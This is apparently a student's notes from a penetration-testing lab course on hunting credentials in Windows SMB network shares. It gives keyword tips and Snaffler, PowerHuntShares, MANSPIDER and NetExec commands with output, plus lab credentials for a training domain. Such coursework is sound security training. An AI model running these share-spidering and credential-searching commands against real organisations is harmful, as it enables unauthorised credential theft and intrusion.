- quick reminder, here are some general tips:

- Look for keywords within files such as `passw`, `user`, `token`, `key`, and `secret`.
- Search for files with extensions commonly associated with stored credentials, such as `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`.
- Watch for files with "interesting" names that include terms like `config`, `user`, `passw`, `cred`, or `initial`.
- If you're trying to locate credentials within the `INLANEFREIGHT.LOCAL` domain, it may be helpful to search for files containing the string `INLANEFREIGHT\`.
- Keywords should be localized based on the target; if you are attacking a German company, it's more likely they will reference a `"Benutzer"` than a `"User"`.
- Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it's going to take a significant amount of time. Shares used by `IT employees` might be a more valuable target than those used for company photos.

## Hunting from Windows

#### Snaffler

```cmd-session
Snaffler.exe -s
```


- Two useful parameters that can help refine Snaffler's search process are:

- `-u` retrieves a list of users from Active Directory and searches for references to them in files
- `-i` and `-n` allow you to specify which shares should be included in the search
#### PowerHuntShares

- Doesn't necessarily need to be run on a domain-joined machine.

```powershell-session
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```


## Hunting from Linux

#### MANSPIDER

If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux. It's best to run `MANSPIDER` using the official Docker container to avoid dependency issues. Like the other tools, `MANSPIDER` offers many parameters that can be configured to fine-tune the search. A basic scan for files containing the string `passw` can be run as follows:

  Credential Hunting in Network Shares

```shell-session
HrithikManoj000@htb[/htb]$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'

[+] MANSPIDER command executed: /usr/local/bin/manspider 10.129.234.121 -c passw -u mendres -p Inlanefreight2025!
[+] Skipping files larger than 10.00MB
[+] Using 5 threads
[+] Searching by file content: "passw"
[+] Matching files will be downloaded to /root/.manspider/loot
[+] 10.129.234.121: Successful login as "mendres"
[+] 10.129.234.121: Successful login as "mendres"
<SNIP>
```

#### NetExec

In addition to its many other uses, `NetExec` can also be used to search through network shares using the `--spider` option. This functionality is described in great detail on the [official wiki](https://www.netexec.wiki/smb-protocol/spidering-shares). A basic scan of network shares for files containing the string `"passw"` can be run like so:

  Credential Hunting in Network Shares

```shell-session
HrithikManoj000@htb[/htb]$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"

SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.234.121  445    DC01             [*] Started spidering
SMB         10.129.234.121  445    DC01             [*] Spidering .
<SNIP>
```


## Lab

One of the shares mendres has access to contains valid credentials of another domain user. What is their password?

- First we can list the shares with nxc using the credentials provided: 
```
nxc smb <IP> -u 'mendres' -p 'Inlanefreight2025!' --shares
```
